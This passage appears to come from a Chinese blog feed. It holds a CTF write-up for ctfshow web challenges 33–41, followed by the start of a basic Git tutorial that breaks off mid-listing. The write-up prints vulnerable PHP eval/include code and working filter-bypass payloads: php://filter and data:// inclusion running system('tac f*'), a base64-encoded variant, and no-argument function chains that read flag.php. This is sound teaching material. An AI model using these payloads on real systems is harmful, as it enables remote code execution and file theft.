class="line">PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMgQERhdGU6ICAgMjAyMC0wOS0wNCAwMDo0OToxOQ0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhhDQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMDQgMDA6NDk6MjYNCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KJGZsYWc9ImN0ZnNob3d7Y2Q2Y2RmODEtNmQ1ZC00ZjdhLThkMzctODUzMzY4NTY4NWFkfSI7DQo=</span><br></pre></td></tr></table></figure><p>找一个base64解码的网站进行解码，成功获取到flag</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240912151824567.png" alt="image-20240912151824567" /></p><h3 id="web-33"><a class="markdownIt-Anchor" href="#web-33"></a> web 33</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>增加了对双引号 <code>&quot;</code> 的限制，include函数可以省略引号</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[cmd]<span class="meta">?&gt;</span>&amp;cmd=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h3 id="web-34"><a class="markdownIt-Anchor" href="#web-34"></a> web 34</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多过滤了冒号 <code>:</code>，直接用前面的payload即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[cmd]<span class="meta">?&gt;</span>&amp;cmd=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h3 id="web-35"><a class="markdownIt-Anchor" href="#web-35"></a> web 35</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>增加了对 <code>&lt;</code> 和 <code>=</code> 的过滤</p><p>还是直接继续使用前面的payload即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[cmd]<span class="meta">?&gt;</span>&amp;cmd=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h3 id="web-36"><a class="markdownIt-Anchor" href="#web-36"></a> web 36</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>添加了对数字的过滤</p><p>payload不变</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[cmd]<span class="meta">?&gt;</span>&amp;cmd=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h3 id="web-37"><a class="markdownIt-Anchor" href="#web-37"></a> web 37</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题的代码结构相比之前的产生了变化，如果参数c中没有flag，则使用 <code>include()</code> 函数来包含该参数，并且通过 <code>echo $flag;</code> 输出文件中的 <code>$flag</code> 变量值。</p><p>相比web 36，这里在源代码里面直接使用了include，所以我们传入的参数里面就可以不再使用include函数，直接使用伪协议即可。</p><p><code>php://filter/</code> 通常用于对文件内容进行处理（如编码、转换），因为这里对flag进行了过滤，而<strong>通配符绕过仅仅只能应用在系统命令上，<code>php://filter</code> 只能对明确的文件路径进行处理</strong>，即下面的绕过方法是不能成功的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=php:<span class="comment">//filter/read=convert.base64-encode/resource=fl*.php</span></span><br></pre></td></tr></table></figure><p>所以这里考虑使用 <code>data://</code> 协议，因为 <code>data://</code> 协议可以直接包含任意数据并执行它，<strong>即如果数据是 PHP 代码，并且 <code>include</code> 或 <code>eval</code> 这类函数引用它，PHP 将解析并执行这些代码。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/palin,&lt;?php system(&quot;tac f*&quot;);?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="web-38"><a class="markdownIt-Anchor" href="#web-38"></a> web 38</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相比上一题新增过滤了php、file，可以继续data://协议，但是因为过滤了php，使用base64加密一下</p><ul><li><p><strong>方法1：使用base64加密</strong></p><p>data://协议中，我们可以直接嵌入并执行 Base64 编码后的 PHP 代码，来绕过对php字段的过滤，这里我们将 <code>&lt;?php system(&quot;tac f*&quot;); ?&gt;</code> 命令进行base64编码成 <code>PD9waHAgc3lzdGVtKCJ0YWMgZioiKTs/Pg==</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZioiKTs/Pg==</span></span><br></pre></td></tr></table></figure></li><li><p><strong>方法2：短标签</strong></p><p><code>&lt;?= ?&gt;</code> 是 PHP 的短标签，等同于 <code>&lt;?php echo ?&gt;</code>。它会输出 <code>system()</code> 函数的结果，类似于 <code>&lt;?php echo system(&quot;tac f*&quot;); ?&gt;</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/palin,&lt;?=system(&quot;tac f*&quot;);?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="web-39"><a class="markdownIt-Anchor" href="#web-39"></a> web 39</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>include($c.&quot;.php&quot;)</code> 会在用户传递的 <code>$c</code> 参数尾部拼接一个 <code>.php</code> ，构成文件路径进行包含，意味着我们只能包含 <code>.php</code> 文件。</p><p>这里我们可以直接使用data://伪协议：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain,&lt;?php system(&#x27;tac f*&#x27;);?&gt;</span></span><br></pre></td></tr></table></figure><p>在后端运行的时候，因为前面的php语句已经闭合，所以后面的 <code>.php</code> 会被当成html页面直接显示在页面上。在伪协议中嵌入的 PHP 代码 <code>&lt;?php system('tac f*');?&gt;</code> 会被直接解析和执行，因此可以无视 <code>.php</code> 后缀，相当于运行了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat f*&#x27;</span>);<span class="meta">?&gt;</span>.php</span><br></pre></td></tr></table></figure><p>注意这里并不能使用base64加密命令的方法，因为在后面拼接的 <code>.php</code> 会导致解析路径混乱，从而解析失败。</p><h3 id="web-40"><a class="markdownIt-Anchor" href="#web-40"></a> web 40</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题目通过正则表达式过滤了大量特殊字符和数字，注意正则中的括号为中文括号。</p><p>这里可以<strong>构造无参数函数进行文件读取</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())));</span><br></pre></td></tr></table></figure><blockquote><p>这里 <code>pos(localeconv())</code> 得到点号，因为 <code>scandir(’.’)</code> 表示得到当前目录下的文件，所以<code>scandir(pos(localeconv()))</code> 就能得到flag.php了。</p></blockquote><p>访问后返回如下：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20241012151252771.png" alt="image-20241012151252771" /></p><p>表明在当前目录下有两个文件 <code>flag.php</code> 和 <code>index.php</code>，接下来我们想要访问 <code>flag.php</code> 文件，即这个数组的倒数第二个元素，直接将数组逆序在将指针调整到下一个就好了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure><p>访问，可以看到成功获取到了 <code>flag.php</code> 元素</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20241012152437000.png" alt="image-20241012152437000" /></p><p>接下来就需要读取这个文件的内容，构造参数后访问成功得到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure><h3 id="web-41"><a class="markdownIt-Anchor" href="#web-41"></a> web 41</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>相比之前的题目，传参变成了post，字母数字全被过滤，为<strong>无字母数字绕过</strong>类型。</p><p><code>eval(&quot;echo($c);&quot;);</code> 中：<code>eval</code> 会把 <code>&quot;echo($c);&quot;</code> 作为 PHP 代码来执行，<code>$c</code> 中的代码执行后，<code>echo</code> 会把返回的内容显示在页面上。</p><p>注意到这里没有对”或运算“进行过滤，考虑：<strong>或运算绕过</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『Git』Git使用教程</title>
      <link href="/posts/b860.html"/>
      <url>/posts/b860.html</url>
      
        <content type="html"><![CDATA[<h1 id="基本概念"><a class="markdownIt-Anchor" href="#基本概念"></a> 基本概念</h1><ol><li><p><strong>概念</strong></p><p>Git 是一种 <strong>分布式版本控制系统</strong>（DVCS），用于跟踪文件的更改，特别适用于软件开发。它允许多个开发者协作处理同一个项目，并能有效管理代码的历史记录。</p></li><li><p><strong>Git 与 GitHub、GitLab 的区别</strong></p><p>GitHub、GitLab 等是 <mark>基于 Git 的代码托管平台</mark>，允许开发者远程存储和管理 Git 仓库。它提供了一系列协作工具，如 issue 追踪、Pull Request（PR）合并、代码审查等。</p></li><li><p><strong>SVN 与 Git 的区别</strong></p><ul><li><p>SVN是集中式版本控制系统，版本库是集中放在中央服务器的，而干活的时候，用的都是自己的电脑，所以首先要从中央服务器哪里得到最新的版本，然后干活，干完后，需要把自己做完的活推送到中央服务器。集中式版本控制系统是必须联网才能工作，如果在局域网还可以，带宽够大，速度够快，如果在互联网下，如果网速慢的话，就纳闷了。</p></li><li><p>Git是分布式版本控制系统，那么它就没有中央服务器的，每个人的电脑就是一个完整的版本库，这样，工作的时候就不需要联网了，因为版本都是在自己的电脑上。既然每个人的电脑都有一个完整的版本库，那多个人如何协作呢？比如说自己在电脑上改了文件A，其他人也在电脑上改了文件A，这时，你们两之间只需把各自的修改推送给对方，就可以互相看到对方的修改了。</p></li></ul></li><li><p><strong>Git 的工作原理</strong></p><p><strong>1）工作区、暂存区和本地仓库</strong></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240617170934979.png" alt="image-20240617170934979" /></p><ul><li>工作区就是我们在文件资源管理器里面看到的项目文件夹，包含所有的代码和文件。这里的文件可以是新创建的、修改过的，甚至是删除的。但这些更改并不会自动被 Git 追踪，必须手动添加到暂存区。</li><li>暂存区是 Git 记录变更的 <strong>临时存放区</strong>，当你使用 <code>git add</code> 命令时，修改会被加入暂存区，只有暂存区中的内容才能被 <code>git commit</code> 提交到本地仓库。它保存了当前文件的状态，而不会影响其他未暂存的文件。</li><li>本地仓库存放的是你所有的提交历史，保存在 <code>.git</code> 目录中。当你运行 <code>git commit</code> 时，暂存区的内容就会被提交到本地仓库，形成一个新的提交记录。这里的文件是 <strong>受 Git 版本控制的</strong>，<strong>但还没有推送到远程仓库</strong>。</li></ul><p><strong>2）本地仓库和远程仓库</strong></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240619105114200.png" alt="image-20240619105114200" /></p><p>远程仓即远程仓库是存放在 GitHub、GitLab、Bitbucket 等代码托管平台上的仓库。</p></li></ol><h1 id="初始化配置"><a class="markdownIt-Anchor" href="#初始化配置"></a> 初始化配置</h1><ol><li><p><strong>下载安装Git并连接Github</strong></p><p>参考：<a href="https://blog.csdn.net/secretstarlyp/article/details/106576882">https://blog.csdn.net/secretstarlyp/article/details/106576882</a></p></li><li><p><strong>配置用户名和邮箱</strong></p><p>后续每一个 Git 提交都会使用这些信息，这样在提交的时候才能识别出来是谁提交的内容。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name isoda_das</span><br><span class="line">git config --global user.email xxxxx@qq.com</span><br><span class="line"><span class="comment"># 保存</span></span><br><span class="line">git config --global credential.helper store</span><br></pre></td></tr></table></figure><blockquote><p>这里使用了–global参数，表示该设置为全局配置，对所有仓库有效。如果不设置的话仅对本地仓库有效</p></blockquote></li><li><p><strong>查看配置信息是否生效</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global --list</span><br></pre></td></tr></table></figure></li></ol><h1 id="git-基础命令"><a class="markdownIt-Anchor" href="#git-基础命令"></a> Git 基础命令</h1><h2 id="新建git仓库"><a class="markdownIt-Anchor" href="#新建git仓库"></a> 新建Git仓库</h2><p>新建一个文件夹或现有的文件夹并不是 git 仓库，因为文件夹内不包含 <code>.git</code> 文件夹，没有被 git 管理。</p><p>所以可以在你希望使用 git 管理的文件夹下，运行如下命令初始化空的git版本库。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure><p>初始化完成后，如果在项目文件夹中没有看到 <code>.git</code> 文件夹，则需要开启显示隐藏文件。</p><h2 id="记录更新到git仓库"><a class="markdownIt-Anchor" href="#记录更新到git仓库"></a> 记录更新到Git仓库</h2><p><mark>流程：工作区开发—&gt;将修改后的文件添加到暂存区—&gt;将暂存区的文件记录到版本库</mark></p><ol><li><p><strong>把工作区变化的文件添加到暂存区</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将 index.html 添加到暂存区  </span></span><br><span class="line">git add index.html  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 将css目录下一切添加到暂存区  </span></span><br><span class="line">git add css  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加所有后缀为txt的文件</span></span><br><span class="line">git add *.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将当前目录下所有变化都暂存  </span></span><br><span class="line">git add . </span><br></pre></td></tr></table></figure></li><li><p><strong>将暂存区内的文件提交到本地仓库</strong></p><p>注意这里不会提交工作区的文件，此处文字说明可以不加引号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接输入提交信息</span></span><br><span class="line">git commit -m <span class="string">&quot;第一次提交&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># vim输入提交信息</span></span><br><span class="line">git commit</span><br></pre></td></tr></table></figure><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240617165754681.png" alt="image-20240617165754681" /></p></li></ol><h2 id="查看状态"><a class="markdownIt-Anchor" href="#查看状态"></a> 查看状态</h2><ol><li><p><strong>查看提交记录</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">log</span></span><br></pre></td></tr></table></figure><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240617170254390.png" alt="image-20240617170254390" /></p></li><li><p><strong>查看仓库状态</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure><p>可以看到</p><ul><li>绿色：表示已经被添加到暂存区，但未被提交（到本地仓库）</li><li>红色：未被跟踪，即没有被添加到暂存区的文件</li></ul><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240617163425847.png" alt="image-20240617163425847" /></p></li><li><p><strong>版本差异检查</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 比较工作区和暂存区的差异</span></span><br><span class="line">git diff </span><br><span class="line"><span class="comment"># 比较工作区和本地仓库的差异</span></span><br><span class="line">git diff HEAD</span><br><span class="line"><span class="comment"># 比较暂存区和本地仓库的差异</span></span><br><span class="line">git diff --cache</span><br><span class="line"><span class="comment"># 比较两个版本提交记录之间的差异</span></span><br><span class="line">git diff 5af90b8 7100ee3</span><br><span class="line"><span class="comment"># 